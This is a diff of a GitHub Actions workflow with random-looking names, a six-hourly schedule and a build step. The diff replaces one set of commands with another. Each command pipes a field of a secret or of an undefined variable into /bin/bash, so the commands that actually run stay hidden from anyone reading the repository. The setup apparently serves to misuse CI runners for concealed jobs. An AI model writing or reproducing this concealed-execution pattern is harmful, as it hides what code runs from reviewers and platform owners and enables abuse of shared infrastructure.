@@ -1,28 +1,22 @@
 name: dongyinwei6712
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 5/6 * * *'
-jobs:  # 13780
+    - cron: '1 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongyinwei6712
         env:
-          yjqi41: ${{ secrets.yjqi41 }}
+          izz86498: ${{ secrets.izz86498 }}
         run: |
-          echo $yjqi41 | jq -r .zdyu189 | /bin/bash
-          echo $p1 | jq -r .ew31 | /bin/bash
-          echo $fqo000 | jq -r .soo26 | /bin/bash
-          echo $pcwq925 | jq -r .coym9268 | /bin/bash
-          echo $o44036 | jq -r .p08 | /bin/bash
-          echo $y732 | jq -r .ylrg744 | /bin/bash
-          echo $xyvv36108 | jq -r .hgf1367 | /bin/bash
-          echo $khytw9 | jq -r .yknl368 | /bin/bash
-          echo $ovev1436 | jq -r .rdyo97450 | /bin/bash
-          echo $bwtza33031 | jq -r .zb50470 | /bin/bash
-          echo $t905 | jq -r .xfllq7930 | /bin/bash
+          echo $izz86498 | jq -r .jrm8 | /bin/bash
+          echo $nny49 | jq -r .jy227 | /bin/bash
+          echo $wow04237 | jq -r .ynm8 | /bin/bash
+          echo $wmkzi1678 | jq -r .vmkni21535 | /bin/bash
+          echo $u815 | jq -r .lv3 | /bin/bash
+          echo $rrjq2 | jq -r .yyqkt68 | /bin/bash
 
